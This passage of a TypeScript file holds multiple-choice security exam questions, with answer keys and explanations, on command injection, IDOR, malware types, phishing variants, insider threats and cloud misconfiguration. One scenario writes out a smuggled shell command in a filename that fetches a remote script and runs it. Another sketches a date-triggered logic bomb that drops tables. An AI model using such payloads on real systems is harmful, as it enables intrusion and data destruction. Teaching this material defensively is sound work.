import { q } from "./helpers";

// Sister questions: each concept has three differently-worded questions on the same idea.
export const sisterQuestionsB = [
  // ---------- Command injection ----------
  q({
    id: "sis-command-injection-1",
    conceptIds: ["command-injection"],
    difficulty: "exam",
    scenario:
      "A web app lets users convert uploaded images. The code builds the call as: system(\"convert \" + filename + \" out.png\"). A tester uploads a file named photo.jpg && curl http://198.51.100.7/s.sh | sh.",
    stem: "Which change BEST fixes the underlying flaw?",
    options: [
      "Encrypt the uploaded files at rest",
      "Add a web application firewall rule for the word curl",
      "Call the converter through an API that passes arguments separately, and validate the filename against an allow list",
      "Require users to log in before uploading",
    ],
    correct: ["c"],
    explanation:
      "The filename is joined into a shell command, so shell operators like && start new commands. Passing arguments without a shell and allow-listing input removes the injection path.",
    why: {
      a: "Encryption at rest protects stored data but does nothing about how the filename reaches the shell.",
      b: "Blocking one word is easy to bypass with other commands or encodings; the shell call is still unsafe.",
      d: "Authentication limits who can upload, but any logged-in user could still inject commands.",
    },
  }),
  q({
    id: "sis-command-injection-2",
    conceptIds: ["command-injection"],
    difficulty: "intermediate",
    stem: "What distinguishes command injection from SQL injection?",
    options: [
      "Command injection targets the browser, while SQL injection targets the server",
      "Command injection runs attacker input as operating-system shell commands, while SQL injection alters a database query",
      "Command injection requires stolen credentials, while SQL injection does not",
      "Command injection only affects Windows servers",
    ],
    correct: ["b"],
    explanation:
      "Both abuse unsanitized input, but command injection reaches the OS shell and SQL injection reaches the database engine.",
    why: {
      a: "Both run on the server side; attacks that run in the browser are things like XSS.",
      c: "Neither attack needs stolen credentials; both exploit how input is handled.",
      d: "Command injection affects any OS that has a shell, including Linux and Windows.",
    },
  }),

  // ---------- IDOR ----------
  q({
    id: "sis-idor-1",
    conceptIds: ["idor"],
    difficulty: "exam",
    scenario:
      "A healthcare portal lets patients download lab results at /results/download?file=88412. A penetration tester logged in as patient A downloads results 88413 through 88500, which belong to other patients.",
    stem: "Which control MOST directly fixes this issue?",
    options: [
      "Enforce TLS 1.3 on the portal",
      "Rate-limit the login page",
      "Encode output to stop script execution",
      "Check on the server that the requested record belongs to the logged-in user before returning it",
    ],
    correct: ["d"],
    explanation:
      "This is an insecure direct object reference: the app trusts the ID without an authorization check. A server-side ownership check on every request fixes it.",
    why: {
      a: "TLS protects data in transit but the server would still hand over other patients' files.",
      b: "The tester was already logged in legitimately; login rate limits don't affect record access.",
      c: "Output encoding prevents XSS, which is not involved here.",
    },
  }),
  q({
    id: "sis-idor-2",
    conceptIds: ["idor"],
    difficulty: "intermediate",
    scenario:
      "An API log shows one account making requests to /api/users/1001/profile, /api/users/1002/profile, /api/users/1003/profile and so on, each returning HTTP 200 with a different person's data.",
    stem: "What does this log MOST likely show?",
    options: [
      "Someone enumerating object IDs to exploit missing authorization checks",
      "A distributed denial-of-service attack",
      "A replay of one captured session token",
      "Cross-site request forgery against an administrator",
    ],
    correct: ["a"],
    explanation:
      "One user stepping through sequential IDs and getting other people's data is the classic sign of IDOR.",
    why: {
      b: "The traffic comes from one account and the server keeps answering, so it is not a flood meant to stop service.",
      c: "A replay resends the same request; here each request asks for a different object.",
      d: "CSRF makes a victim's browser send a request; this is one account directly requesting many records.",
    },
  }),

  // ---------- Keylogger ----------
  q({
    id: "sis-keylogger-1",
    conceptIds: ["keylogger"],
    difficulty: "intermediate",
    scenario:
      "EDR on a laptop flags a process that hooks keyboard input for every application and writes the results to a hidden text file that is uploaded every hour.",
    stem: "Which control would MOST reduce the damage this malware can cause with what it collects?",
    options: [
      "Longer password expiration periods",
      "Multifactor authentication using a phone-based authenticator",
      "Disk defragmentation",
      "A host-based firewall allowing all outbound traffic",
    ],
    correct: ["b"],
    explanation:
      "A keylogger captures typed passwords. With MFA, a stolen password alone is not enough to log in.",
    why: {
      a: "Keeping passwords longer gives the attacker more time to use them.",
      c: "Defragmentation is disk maintenance and has no security effect.",
      d: "Allowing all outbound traffic lets the captured data leave freely.",
    },
  }),

  // ---------- Rootkit ----------
  q({
    id: "sis-rootkit-1",
    conceptIds: ["rootkit"],
    difficulty: "exam",
    scenario:
      "An investigator suspects a server has malware that modified the kernel to hide its files and processes from the running operating system.",
    stem: "What is the MOST reliable way to check for it?",
    options: [
      "Run the antivirus already installed on the live server",
      "Ask the user whether the server seems slow",
      "Boot from trusted external media or analyze the disk image offline",
      "Review the server's Task Manager for unknown processes",
    ],
    correct: ["c"],
    explanation:
      "A rootkit controls what the infected OS reports. Examining the system from a trusted, separate environment avoids its hiding tricks.",
    why: {
      a: "Tools running on the compromised OS can be fooled by the rootkit.",
      b: "Performance complaints are not reliable evidence of a hidden kernel implant.",
      d: "Task Manager relies on the same OS calls the rootkit has altered.",
    },
  }),

  // ---------- Smishing ----------
  q({
    id: "sis-smishing-1",
    conceptIds: ["smishing", "vishing"],
    difficulty: "intermediate",
    scenario:
      "Staff get a text that appears to come from the payroll team: 'Your direct deposit failed. Confirm your account here: hr-pay-update.example'.",
    stem: "Which social engineering technique does this BEST describe?",
    options: ["Vishing", "Whaling", "Watering-hole attack", "Smishing"],
    correct: ["d"],
    explanation: "Phishing sent by SMS text message is smishing.",
    why: {
      a: "Vishing uses voice calls, not text messages.",
      b: "Whaling targets senior executives, usually by email; this went to general staff by text.",
      c: "A watering-hole attack compromises a site the victims already visit, not a message sent to them.",
    },
  }),
  q({
    id: "sis-smishing-2",
    conceptIds: ["smishing"],
    difficulty: "exam",
    stem: "A company sees a rise in fake delivery texts sent to employees' work phones. Which action would BEST reduce the risk?",
    options: [
      "Disable Wi-Fi on all mobile devices",
      "Train users to verify unexpected texts through official channels and report them, and apply mobile threat protection that filters malicious links",
      "Require longer email passwords",
      "Block all inbound phone calls from unknown numbers",
    ],
    correct: ["b"],
    explanation:
      "Smishing relies on users tapping links in texts, so awareness plus mobile link filtering addresses it directly.",
    why: {
      a: "Texts arrive over the cellular network, so disabling Wi-Fi doesn't stop them.",
      c: "Email password length has nothing to do with SMS lures.",
      d: "Blocking calls addresses vishing, not text messages.",
    },
  }),

  // ---------- Vishing ----------
  q({
    id: "sis-vishing-1",
    conceptIds: ["vishing"],
    difficulty: "exam",
    scenario:
      "A finance clerk receives a phone call. The caller ID shows the bank's real number, and the caller says the company account is frozen and asks the clerk to confirm the online banking login.",
    stem: "What should the clerk do FIRST?",
    options: [
      "End the call and call the bank back using the number on the bank's official website or statement",
      "Give the login because the caller ID matches the bank",
      "Ask the caller to send the request by text message instead",
      "Read back only the first half of the password",
    ],
    correct: ["a"],
    explanation:
      "Caller ID can be spoofed. Calling back on a known, trusted number confirms whether the request is real.",
    why: {
      b: "Caller ID spoofing is common in vishing, so a matching number proves nothing.",
      c: "Moving the conversation to SMS just changes the channel; it still comes from the attacker.",
      d: "Any part of a password helps an attacker and should never be shared.",
    },
  }),
  q({
    id: "sis-vishing-2",
    conceptIds: ["vishing"],
    difficulty: "intermediate",
    stem: "Which statement about vishing is accurate?",
    options: [
      "It always requires malware on the victim's phone",
      "It is phishing that uses text messages with links",
      "It uses voice calls, sometimes with spoofed caller ID or AI-generated voices, to pressure victims into revealing information",
      "It only targets senior executives",
    ],
    correct: ["c"],
    explanation: "Vishing is voice phishing: the attacker talks the victim into giving up data or taking an action.",
    why: {
      a: "Vishing works purely by persuasion; no malware is needed.",
      b: "Phishing by text message is smishing.",
      d: "Attacks aimed specifically at executives are whaling; vishing can target anyone.",
    },
  }),

  // ---------- Watering hole ----------
  q({
    id: "sis-watering-hole-1",
    conceptIds: ["watering-hole"],
    difficulty: "exam",
    scenario:
      "Several employees at different branches of a regional bank are infected on the same day. None received suspicious email. All had visited the website of a local banking trade association that morning.",
    stem: "Which attack is MOST likely?",
    options: ["Typosquatting", "Watering-hole attack", "Spear phishing", "Worm propagation"],
    correct: ["b"],
    explanation:
      "The attackers compromised a site the target group trusts and visits, then infected visitors. That is a watering-hole attack.",
    why: {
      a: "Typosquatting relies on a mistyped look-alike domain; these users visited the real site.",
      c: "Spear phishing sends tailored messages, and no suspicious email was received.",
      d: "A worm spreads between hosts on its own; here each victim was infected by browsing the same site.",
    },
  }),
  q({
    id: "sis-watering-hole-2",
    conceptIds: ["watering-hole"],
    difficulty: "intermediate",
    stem: "Which set of controls BEST protects users against watering-hole attacks?",
    options: [
      "Strong email spam filtering only",
      "Disabling SMS on corporate phones",
      "Longer password requirements",
      "Prompt browser and plug-in patching, web filtering, and browser isolation or sandboxing",
    ],
    correct: ["d"],
    explanation:
      "Watering-hole attacks deliver exploits through trusted websites, so keeping browsers patched and filtering or isolating web content is the defense.",
    why: {
      a: "Watering-hole attacks avoid email entirely, which is why attackers use them against well-filtered targets.",
      b: "SMS is unrelated to infection through a website.",
      c: "Passwords don't stop a browser exploit delivered by a compromised site.",
    },
  }),

  // ---------- Ransomware ----------
  q({
    id: "sis-ransomware-1",
    conceptIds: ["ransomware"],
    difficulty: "exam",
    scenario:
      "At 2:14 a.m., a file server shows thousands of files being rewritten per minute with high-entropy content and new extensions, coming from one workstation's mapped drive.",
    stem: "What should the incident responder do FIRST?",
    options: [
      "Isolate the workstation from the network",
      "Pay the ransom to get the key quickly",
      "Restore last night's backup over the live share immediately",
      "Delete the ransom notes from every folder",
    ],
    correct: ["a"],
    explanation:
      "Mass encryption from one host points to ransomware in progress. Containing the source first stops more files from being encrypted.",
    why: {
      b: "Paying is never a first step and doesn't guarantee recovery.",
      c: "Restoring before containment lets the ransomware encrypt the restored files too.",
      d: "Deleting notes destroys evidence and does nothing to stop the encryption.",
    },
  }),

  // ---------- Trojan ----------
  q({
    id: "sis-trojan-1",
    conceptIds: ["trojan"],
    difficulty: "intermediate",
    scenario:
      "A user downloads a 'free video editor' from a forum. The editor works, but the firewall soon shows the PC beaconing to an unknown server, and an attacker later browses the user's files remotely.",
    stem: "Which term BEST describes the software the user installed?",
    options: ["Worm", "Logic bomb", "Trojan carrying a remote access tool", "Virus"],
    correct: ["c"],
    explanation:
      "The user willingly installed software that looked legitimate but secretly included remote access. That is a Trojan (here a RAT).",
    why: {
      a: "A worm spreads by itself; this needed the user to install it.",
      b: "A logic bomb waits for a trigger condition; this gave immediate remote control.",
      d: "A virus attaches to and infects other files; nothing here infected other files.",
    },
  }),

  // ---------- Worm ----------
  q({
    id: "sis-worm-1",
    conceptIds: ["worm"],
    difficulty: "exam",
    stem: "Which control would BEST limit how far a worm that exploits a network service vulnerability can spread inside a company?",
    options: [
      "Network segmentation with patching of the vulnerable service",
      "User awareness training on email attachments",
      "Stronger password complexity rules",
      "Encrypting the backup tapes",
    ],
    correct: ["a"],
    explanation:
      "A worm moves host to host through a vulnerable service. Patching removes the hole and segmentation stops it reaching other networks.",
    why: {
      b: "Worms spread without user action, so attachment training doesn't stop them.",
      c: "An exploited service vulnerability doesn't need a password.",
      d: "Encrypting backups protects their confidentiality, not the spread of malware.",
    },
  }),

  // ---------- Logic bomb ----------
  q({
    id: "sis-logic-bomb-1",
    conceptIds: ["logic-bomb"],
    difficulty: "intermediate",
    scenario:
      "During a code review, an auditor finds this in a billing script written by a contractor: if (today == '2027-01-01') { drop all invoice tables }. The script has run normally for months.",
    stem: "What has the auditor found?",
    options: ["A backdoor", "A logic bomb", "Spyware", "A buffer overflow"],
    correct: ["b"],
    explanation: "Code that sits dormant and does damage only when a set date or condition occurs is a logic bomb.",
    why: {
      a: "A backdoor provides hidden access; this code destroys data on a date.",
      c: "Spyware monitors and reports activity; this code deletes tables.",
      d: "A buffer overflow is a memory flaw, not intentionally planted conditional code.",
    },
  }),
  q({
    id: "sis-logic-bomb-2",
    conceptIds: ["logic-bomb"],
    difficulty: "exam",
    stem: "Which practice would MOST likely catch a logic bomb planted by a privileged developer before it triggers?",
    options: [
      "Mandatory peer code review and change management for production code",
      "Signature-based antivirus on user laptops",
      "Disabling USB ports on servers",
      "Enabling Wi-Fi encryption",
    ],
    correct: ["a"],
    explanation:
      "Logic bombs are often written by insiders and stay dormant, so a second person reviewing code changes is the best chance to spot them.",
    why: {
      b: "Custom dormant code usually has no known signature, and it sits on servers, not laptops.",
      c: "The code arrives through normal deployment, not USB.",
      d: "Wireless encryption has nothing to do with malicious code in an application.",
    },
  }),

  // ---------- Adware ----------
  q({
    id: "sis-adware-1",
    conceptIds: ["adware"],
    difficulty: "beginner",
    scenario:
      "After installing a free PDF tool, a user's browser search engine changes to an unfamiliar one and every page shows extra banner ads. No data appears to leave the PC beyond ad requests.",
    stem: "Which type of unwanted software is MOST likely installed?",
    options: ["Ransomware", "Rootkit", "Keylogger", "Adware"],
    correct: ["d"],
    explanation: "Unwanted ads and hijacked browser settings after a free download are the signs of adware.",
    why: {
      a: "Ransomware encrypts data and demands payment.",
      b: "A rootkit hides itself; it doesn't announce itself with ads.",
      c: "A keylogger quietly records keystrokes rather than showing ads.",
    },
  }),

  // ---------- Threat actors ----------
  q({
    id: "sis-threat-actors-1",
    conceptIds: ["threat-actors"],
    difficulty: "intermediate",
    scenario:
      "A teenager downloads a ready-made attack tool from a forum and launches it against a school website. The attack uses only public scripts and is quickly blocked.",
    stem: "Which threat actor type BEST fits this attacker?",
    options: ["Nation-state", "Unskilled attacker", "Organized crime", "Insider threat"],
    correct: ["b"],
    explanation:
      "Someone using pre-built tools with little skill or funding is an unskilled attacker (once called a script kiddie).",
    why: {
      a: "Nation-states have high skill and large budgets and use custom tooling.",
      c: "Organized crime groups are well-resourced and financially motivated, not one person using public scripts.",
      d: "An insider has legitimate access to the organization; this person is external.",
    },
  }),

  // ---------- Insider threat ----------
  q({
    id: "sis-insider-threat-1",
    conceptIds: ["insider-threat"],
    difficulty: "intermediate",
    scenario:
      "A payroll clerk, trying to work from home, emails a spreadsheet of all employees' salaries and bank details to a personal webmail account. There is no sign of malicious intent.",
    stem: "How should this BEST be classified?",
    options: [
      "An unintentional insider threat",
      "A nation-state attack",
      "A watering-hole attack",
      "Not a security concern because the clerk is trusted",
    ],
    correct: ["a"],
    explanation:
      "Insider threats include careless or accidental misuse of legitimate access, not only malicious acts.",
    why: {
      b: "Nothing points to an external, state-backed attacker.",
      c: "No website was compromised to infect visitors.",
      d: "Sensitive data left the organization's control, which is a real risk regardless of trust.",
    },
  }),
  q({
    id: "sis-insider-threat-2",
    conceptIds: ["insider-threat"],
    difficulty: "exam",
    stem: "Which TWO controls MOST directly reduce the risk from a malicious insider? (Select TWO)",
    options: [
      "Perimeter firewall rules blocking inbound traffic",
      "Least privilege access",
      "Separation of duties for sensitive tasks",
      "Public website TLS certificates",
    ],
    correct: ["b", "c"],
    explanation:
      "Least privilege limits what an insider can reach, and separation of duties means no single person can complete a sensitive action alone.",
    why: {
      a: "Insiders are already inside, so inbound perimeter rules don't restrict them.",
      d: "TLS protects website traffic and does nothing about how employees use their access.",
    },
  }),

  // ---------- Shadow IT ----------
  q({
    id: "sis-shadow-it-1",
    conceptIds: ["shadow-it"],
    difficulty: "exam",
    stem: "A security team wants to discover which unsanctioned SaaS applications employees are using. Which tool is BEST suited?",
    options: [
      "A cloud access security broker (CASB)",
      "A hardware security module",
      "A honeypot",
      "A RADIUS server",
    ],
    correct: ["a"],
    explanation:
      "A CASB analyzes cloud traffic and can reveal and control unapproved cloud services, which is shadow IT.",
    why: {
      b: "An HSM stores and protects cryptographic keys; it doesn't monitor app usage.",
      c: "A honeypot lures attackers; it doesn't inventory employee cloud apps.",
      d: "RADIUS handles network authentication, not discovery of SaaS usage.",
    },
  }),
  q({
    id: "sis-shadow-it-2",
    conceptIds: ["shadow-it", "insider-threat"],
    difficulty: "intermediate",
    scenario:
      "An engineering team sets up its own wireless router in a lab because the corporate Wi-Fi is slow there. They mean no harm, but the router uses a default password.",
    stem: "What is the MAIN security problem with this situation?",
    options: [
      "It is a deliberate attempt by insiders to steal data",
      "It is an evil twin attack",
      "Technology is in use without IT approval, so it isn't secured, monitored or managed",
      "It violates data sovereignty laws",
    ],
    correct: ["c"],
    explanation:
      "Well-meaning staff adding unapproved technology is shadow IT. Its risk is that IT can't secure or monitor what it doesn't know about.",
    why: {
      a: "There is no malicious intent, which separates this from a malicious insider.",
      b: "An evil twin impersonates a legitimate network to trick users; this router was set up for convenience.",
      d: "Data sovereignty concerns where data is stored legally, not an unapproved router.",
    },
  }),

  // ---------- Spear phishing / whaling ----------
  q({
    id: "sis-spear-phishing-whaling-1",
    conceptIds: ["spear-phishing-whaling"],
    difficulty: "intermediate",
    scenario:
      "Three engineers on a satellite project receive emails that name their project lead, mention a design review last Tuesday, and attach 'updated_specs.docm'. No one else in the company got the email.",
    stem: "Which attack is this?",
    options: ["Whaling", "Spam", "Spear phishing", "Pharming"],
    correct: ["c"],
    explanation:
      "The message is tailored with real details and sent to a small, chosen group. That is spear phishing; the targets aren't executives, so it isn't whaling.",
    why: {
      a: "Whaling targets senior executives; these are engineers.",
      b: "Spam is untargeted bulk mail.",
      d: "Pharming redirects users to a fake site through DNS or host-file changes.",
    },
  }),
  q({
    id: "sis-spear-phishing-whaling-2",
    conceptIds: ["spear-phishing-whaling"],
    difficulty: "exam",
    stem: "Executives are being targeted with highly personalized emails built from their public speaking schedules and social media. Which measure would BEST reduce this risk?",
    options: [
      "Disable the executives' accounts during conferences",
      "Targeted awareness training for executives and their assistants, plus limiting what personal detail is published",
      "Require executives to use longer passwords",
      "Move executive mailboxes to an on-premises server",
    ],
    correct: ["b"],
    explanation:
      "Whaling works because attackers research executives. Training those targets and reducing public detail makes the lures less convincing and easier to spot.",
    why: {
      a: "Disabling accounts disrupts business and doesn't address the lures.",
      c: "Password length doesn't help if the executive is tricked into acting on a fake request.",
      d: "Mailbox location doesn't change whether a convincing email gets acted on.",
    },
  }),

  // ---------- BEC / pretexting ----------
  q({
    id: "sis-bec-pretexting-1",
    conceptIds: ["bec-pretexting"],
    difficulty: "intermediate",
    scenario:
      "Someone calls the help desk claiming to be a new auditor from the external audit firm. They mention the audit partner by name and say they urgently need a list of server admin accounts for the audit starting today.",
    stem: "Which social engineering technique is the caller MAINLY using?",
    options: ["Pretexting", "Tailgating", "Typosquatting", "Watering-hole attack"],
    correct: ["a"],
    explanation: "The caller has invented a believable story and role to justify the request. That is pretexting.",
    why: {
      b: "Tailgating is following someone through a secured door.",
      c: "Typosquatting uses look-alike domain names.",
      d: "A watering-hole attack compromises a website the targets visit.",
    },
  }),
  q({
    id: "sis-bec-pretexting-2",
    conceptIds: ["bec-pretexting"],
    difficulty: "exam",
    stem: "Which process control would MOST effectively stop a business email compromise from redirecting a supplier payment?",
    options: [
      "Requiring all email to be encrypted with TLS",
      "Increasing the mailbox storage quota",
      "Deploying a web application firewall",
      "Requiring out-of-band verification and dual approval for any change to payment details",
    ],
    correct: ["d"],
    explanation:
      "BEC often comes from a real but compromised mailbox, so only an independent check outside email, plus a second approver, reliably catches fake payment changes.",
    why: {
      a: "TLS protects mail in transit; a message from a hacked mailbox is still delivered normally.",
      b: "Storage quota has no effect on fraudulent requests.",
      c: "A WAF protects web applications, not email-based payment fraud.",
    },
  }),

  // ---------- Typosquatting ----------
  q({
    id: "sis-typosquatting-1",
    conceptIds: ["typosquatting"],
    difficulty: "exam",
    stem: "A company wants to reduce the chance that customers land on look-alike domains that copy its brand. Which action is MOST effective?",
    options: [
      "Register common misspellings of its domain and monitor new domain registrations for look-alikes",
      "Enable DNSSEC on its existing zone only",
      "Rotate its TLS certificate monthly",
      "Disable HTTP on its web server",
    ],
    correct: ["a"],
    explanation:
      "Owning likely misspellings and watching for new look-alike registrations takes those domains away from attackers or lets the company act quickly.",
    why: {
      b: "DNSSEC protects records in its own zone but does nothing about separate domains attackers register.",
      c: "Certificate rotation doesn't stop someone registering a different, similar domain.",
      d: "Disabling HTTP on the real site doesn't affect fake sites on other domains.",
    },
  }),
  q({
    id: "sis-typosquatting-2",
    conceptIds: ["typosquatting"],
    difficulty: "intermediate",
    scenario:
      "A user types the correct bank address into the browser but ends up on a fake site because the attacker changed DNS records. A second user mistypes the bank's name as 'bankk.example' and also lands on a fake site.",
    stem: "Which user was a victim of typosquatting?",
    options: [
      "The first user",
      "Neither user",
      "The second user",
      "Both users",
    ],
    correct: ["c"],
    explanation:
      "Typosquatting depends on a mistyped or misread address. The first user typed correctly and was redirected by DNS, which is pharming.",
    why: {
      a: "The first user typed the right address; DNS redirection is pharming, not typosquatting.",
      b: "The second user's mistyped domain is exactly what typosquatting relies on.",
      d: "Only the second case depends on a typo.",
    },
  }),

  // ---------- Quishing ----------
  q({
    id: "sis-quishing-1",
    conceptIds: ["quishing"],
    difficulty: "intermediate",
    scenario:
      "A restaurant finds that the QR codes on its tables lead to a page asking for card details, not its real menu. Someone stuck new codes over the originals overnight.",
    stem: "What attack is this?",
    options: ["Smishing", "Quishing", "Pharming", "Bluejacking"],
    correct: ["b"],
    explanation: "Phishing that hides the malicious link in a QR code is quishing.",
    why: {
      a: "Smishing arrives as an SMS text, not a printed code.",
      c: "Pharming redirects a correctly typed address through DNS changes.",
      d: "Bluejacking sends unsolicited messages over Bluetooth.",
    },
  }),
  q({
    id: "sis-quishing-2",
    conceptIds: ["quishing"],
    difficulty: "exam",
    stem: "Which advice BEST protects employees against QR code phishing?",
    options: [
      "Only scan QR codes printed in color",
      "Scan codes with a laptop webcam instead of a phone",
      "Check the full URL the scanner shows before opening it, and don't enter credentials on sites reached from unexpected QR codes",
      "Disable the phone's camera permanently",
    ],
    correct: ["c"],
    explanation:
      "The risk is the hidden link. Previewing the real URL and not logging in through unexpected codes removes the attacker's advantage.",
    why: {
      a: "A code's color says nothing about where it leads; attackers can print color codes too.",
      b: "The device used to scan doesn't make a malicious link safe.",
      d: "Disabling the camera is impractical and removes legitimate uses.",
    },
  }),

  // ---------- Removable media ----------
  q({
    id: "sis-removable-media-1",
    conceptIds: ["removable-media"],
    difficulty: "exam",
    stem: "Which control would BEST prevent malware from being introduced through USB drives found in a parking lot?",
    options: [
      "Endpoint policy that blocks unapproved USB storage and human-interface devices, plus user training",
      "Requiring longer Wi-Fi passwords",
      "Installing CCTV in the parking lot",
      "Encrypting email attachments",
    ],
    correct: ["a"],
    explanation:
      "Device control stops unknown USB devices from working, and training teaches staff not to plug in found media.",
    why: {
      b: "USB drops don't use the wireless network.",
      c: "Cameras may record who dropped the drives but don't stop an employee plugging one in.",
      d: "Email encryption is unrelated to malware on physical media.",
    },
  }),
  q({
    id: "sis-removable-media-2",
    conceptIds: ["removable-media"],
    difficulty: "intermediate",
    scenario:
      "A visitor asks a receptionist to print a boarding pass from a USB stick. Shortly after, the receptionist's PC starts making connections to an unfamiliar external host.",
    stem: "What is the MOST likely way the PC was compromised?",
    options: [
      "A zero-day in the printer firmware",
      "A malicious USB device carrying malware",
      "A deauthentication attack on the Wi-Fi",
      "A replay attack on the PC's login",
    ],
    correct: ["b"],
    explanation:
      "The suspicious activity began right after an unknown USB device was plugged in, which points to malware delivered by removable media.",
    why: {
      a: "Nothing suggests the printer was attacked; the PC began beaconing.",
      c: "Deauthentication disconnects Wi-Fi clients; it doesn't install malware.",
      d: "A replay resends captured authentication; no login was captured here.",
    },
  }),

  // ---------- Attack surface ----------
  q({
    id: "sis-attack-surface-1",
    conceptIds: ["attack-surface"],
    difficulty: "intermediate",
    stem: "Which action REDUCES an organization's attack surface?",
    options: [
      "Adding a new public-facing API for a partner",
      "Leaving vendor default accounts enabled for support",
      "Keeping an end-of-life server online for a legacy app",
      "Disabling services and closing ports that are not needed",
    ],
    correct: ["d"],
    explanation: "Every unneeded open port or service is another way in. Turning off what isn't used shrinks the attack surface.",
    why: {
      a: "A new exposed API adds to the attack surface.",
      b: "Default accounts are well known and increase exposure.",
      c: "End-of-life systems no longer get patches, which increases exposure.",
    },
  }),
  q({
    id: "sis-attack-surface-2",
    conceptIds: ["attack-surface"],
    difficulty: "exam",
    scenario:
      "A scan shows a file server still running an operating system whose vendor support ended two years ago. It hosts an app that can't be moved yet.",
    stem: "What is the BEST way to reduce risk until the app is migrated?",
    options: [
      "Run a vulnerability scan once a year",
      "Isolate the server in a restricted network segment and allow only the traffic the app needs",
      "Rename the server so it is harder to find",
      "Change the server's time zone",
    ],
    correct: ["b"],
    explanation:
      "An unsupported system can't be patched, so the compensating control is to isolate it and tightly limit what can reach it.",
    why: {
      a: "Scanning finds problems but fixes none, and patches don't exist for an unsupported OS.",
      c: "Renaming is security through obscurity and doesn't block access.",
      d: "Time zone settings have no security effect.",
    },
  }),

  // ---------- Buffer overflow ----------
  q({
    id: "sis-buffer-overflow-1",
    conceptIds: ["buffer-overflow"],
    difficulty: "exam",
    stem: "Which TWO measures help protect against buffer overflow exploitation? (Select TWO)",
    options: [
      "Address space layout randomization (ASLR)",
      "Input length checks and bounds checking in the code",
      "Parameterized SQL queries",
      "Anti-CSRF tokens",
    ],
    correct: ["a", "b"],
    explanation:
      "Bounds checking stops data being written past the buffer, and ASLR makes it much harder for an attacker to predict where their code will land.",
    why: {
      c: "Parameterized queries stop SQL injection, not memory overwrites.",
      d: "Anti-CSRF tokens stop forged web requests, not memory corruption.",
    },
  }),
  q({
    id: "sis-buffer-overflow-2",
    conceptIds: ["buffer-overflow"],
    difficulty: "intermediate",
    scenario:
      "An IDS alert shows a request to a legacy service containing a header field of several thousand 'A' characters followed by a block of binary data.",
    stem: "What is the attacker MOST likely attempting?",
    options: [
      "Cross-site scripting",
      "Password spraying",
      "A buffer overflow to execute injected code",
      "A downgrade attack",
    ],
    correct: ["c"],
    explanation:
      "Long filler data followed by a binary payload is the classic pattern of overflowing a buffer to overwrite memory and run code.",
    why: {
      a: "XSS injects script into web pages, not long binary payloads into a service.",
      b: "Password spraying tries common passwords across many accounts.",
      d: "A downgrade attack forces weaker protocol versions during negotiation.",
    },
  }),

  // ---------- Malicious update ----------
  q({
    id: "sis-malicious-update-1",
    conceptIds: ["malicious-update"],
    difficulty: "intermediate",
    scenario:
      "A popular IT monitoring tool installs its routine automatic update. Weeks later, investigators find the signed update contained a backdoor inserted at the vendor's build server, affecting thousands of customers.",
    stem: "Which threat does this BEST describe?",
    options: ["Watering-hole attack", "Malicious update", "Logic bomb", "Typosquatting"],
    correct: ["b"],
    explanation:
      "Attackers tampered with a legitimate update and relied on customers trusting automatic updates. That is a malicious update, a form of supply chain attack.",
    why: {
      a: "A watering-hole attack infects visitors to a compromised website.",
      c: "A logic bomb waits for a trigger; the issue here is how the code was delivered.",
      d: "Typosquatting uses look-alike domains; the update came from the real vendor.",
    },
  }),
  q({
    id: "sis-malicious-update-2",
    conceptIds: ["malicious-update"],
    difficulty: "exam",
    stem: "Even a correctly signed update could be malicious if the vendor's build system is compromised. Which practice BEST limits the impact of such an update?",
    options: [
      "Deploy updates to a small test group first and monitor behavior before rolling out widely",
      "Turn off all updates permanently",
      "Download updates from third-party mirror sites",
      "Install updates only on domain controllers first",
    ],
    correct: ["a"],
    explanation:
      "Staged rollout with monitoring lets odd behavior be spotted on a few systems before the whole fleet is exposed.",
    why: {
      b: "Never patching leaves known vulnerabilities open, which is a bigger risk.",
      c: "Unofficial mirrors increase the chance of tampered files.",
      d: "Domain controllers are the most critical systems; they should not be the test group.",
    },
  }),

  // ---------- VM escape ----------
  q({
    id: "sis-vm-escape-1",
    conceptIds: ["vm-escape"],
    difficulty: "exam",
    scenario:
      "A security bulletin warns of a flaw in a hypervisor's virtual graphics device that lets code in a guest VM run commands on the host.",
    stem: "What is the BEST action for the administrator?",
    options: [
      "Patch the hypervisor and remove unneeded virtual devices from guests",
      "Reset all guest OS passwords",
      "Increase the RAM given to each VM",
      "Take snapshots of every VM",
    ],
    correct: ["a"],
    explanation:
      "The flaw is in the hypervisor, so patching it fixes the escape path, and removing unused virtual hardware reduces exposure.",
    why: {
      b: "Guest passwords don't fix a hypervisor bug.",
      c: "More RAM has no effect on the vulnerability.",
      d: "Snapshots help recovery but don't stop a guest breaking out to the host.",
    },
  }),
  q({
    id: "sis-vm-escape-2",
    conceptIds: ["vm-escape"],
    difficulty: "intermediate",
    stem: "Why is a VM escape considered so serious?",
    options: [
      "It only crashes the single guest VM",
      "It lets an attacker in one guest reach the hypervisor and potentially every other VM on the host",
      "It requires physical access to the data center",
      "It affects only containers, not virtual machines",
    ],
    correct: ["b"],
    explanation: "Breaking out of a guest removes the isolation between workloads, so one compromise can spread to everything on that host.",
    why: {
      a: "Simply crashing a guest is a denial of service; escape means reaching beyond the guest.",
      c: "VM escape is done from software inside the guest, not physical access.",
      d: "VM escape is specifically about breaking out of virtual machines.",
    },
  }),

  // ---------- Cloud misconfiguration ----------
  q({
    id: "sis-cloud-misconfiguration-1",
    conceptIds: ["cloud-misconfiguration"],
    difficulty: "exam",
    stem: "Which control would BEST detect a storage bucket that has been accidentally made public?",
    options: [
      "A host-based intrusion prevention system on employee laptops",
      "A cloud security posture management (CSPM) tool that continuously checks configurations against policy",
      "Full-disk encryption on the bucket's underlying drives",
      "A stronger password for the cloud console",
    ],
    correct: ["b"],
    explanation: "CSPM tools scan cloud settings and alert on risky configurations such as public storage.",
    why: {
      a: "Laptop HIPS can't see cloud storage settings.",
      c: "Encryption at rest doesn't stop public access through the storage service itself.",
      d: "A strong console password doesn't change a bucket's public setting.",
    },
  }),
  q({
    id: "sis-cloud-misconfiguration-2",
    conceptIds: ["cloud-misconfiguration"],
    difficulty: "intermediate",
    scenario:
      "A researcher downloads a company's database backups simply by browsing to a storage URL. No vulnerability was exploited and no password was needed.",
    stem: "What is the root cause of this exposure?",
    options: [
      "A zero-day in the cloud provider's platform",
      "A brute-force attack on the storage account",
      "A misconfigured access setting on the storage",
      "A VM escape",
    ],
    correct: ["c"],
    explanation: "Data was exposed through settings alone, without any exploit. That is a cloud misconfiguration.",
    why: {
      a: "No flaw in the platform was used; the storage behaved as configured.",
      b: "No password was guessed or needed.",
      d: "VM escape breaks out of a virtual machine; this was open storage.",
    },
  }),

  // ---------- Mobile sideloading ----------
  q({
